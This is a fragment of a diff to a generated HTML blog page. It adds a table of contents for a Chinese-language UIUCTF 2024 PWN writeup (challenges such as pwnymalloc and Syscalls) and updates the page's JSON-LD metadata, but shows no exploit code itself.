+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Backup-Power"><span class="toc-text">Backup Power</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%86%B5"><span class="toc-text">概况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnymalloc"><span class="toc-text">pwnymalloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%86%B5-1"><span class="toc-text">概况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rusty-Pointers"><span class="toc-text">Rusty Pointers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%86%B5-2"><span class="toc-text">概况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-1"><span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Syscalls"><span class="toc-text">Syscalls</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%86%B5-3"><span class="toc-text">概况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-3"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-2"><span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Syscalls-2"><span class="toc-text">Syscalls 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%86%B5-4"><span class="toc-text">概况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-4"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-3"><span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3278,6 +3657,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <!-- Custom Files side end -->
 </aside>
+
 
 
         </div>
@@ -4191,7 +4571,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"BeaCox","url":"https://blog.beacox.space/","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/","sameAs":["https://github.com/BeaCox"],"description":"技术与生活分享"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://blog.beacox.space/","name":"BeaCox"}},{"@type":"ListItem","position":2,"item":{"@id":"https://blog.beacox.space/tags/美化/","name":"美化"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"BeaCox","url":"https://blog.beacox.space/","keywords":"黑客 信息安全 web安全 内容安全 系统安全 Linux 博客","description":"技术与生活分享","author":{"@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/","description":"技术与生活分享"},"publisher":{"@type":"Organization","name":"BeaCox","url":"https://blog.beacox.space/","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://blog.beacox.space?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"技术与生活分享","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/"},"publisher":{"@type":"Organization","name":"BeaCox","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"BeaCox","url":"https://blog.beacox.space/","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/","sameAs":["https://github.com/BeaCox"],"description":"技术与生活分享"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://blog.beacox.space/","name":"BeaCox"}},{"@type":"ListItem","position":2,"item":{"@id":"https://blog.beacox.space/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":3,"item":{"@id":"https://blog.beacox.space/posts/uiuctf-2024-wp/","name":"UIUCTF 2024 PWN Writeup"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"BeaCox","url":"https://blog.beacox.space/","keywords":"黑客 信息安全 web安全 内容安全 系统安全 Linux 博客","description":"技术与生活分享","author":{"@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/","description":"技术与生活分享"},"publisher":{"@type":"Organization","name":"BeaCox","url":"https://blog.beacox.space/","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://blog.beacox.space?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"UIUCTF 2024 PWN Writeup","description":"UIUCTF 2024 PWN 题全集（With L3ak）。","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.beacox.space/posts/uiuctf-2024-wp/"},"author":{"@type":"Person","name":"BeaCox","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png"},"url":"https://blog.beacox.space/"},"publisher":{"@type":"Organization","name":"BeaCox","logo":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}},"url":"https://blog.beacox.space/posts/uiuctf-2024-wp/","wordCount":0,"datePublished":"2024-07-07T11:30:00.000Z","dateModified":"2024-07-07T11:30:00.000Z","articleSection":"CTF","keywords":"PWN","image":{"@type":"ImageObject","url":"https://blog.beacox.space/img/android-icon-72x72.png","width":192,"height":192}}]</script>
 
 
 
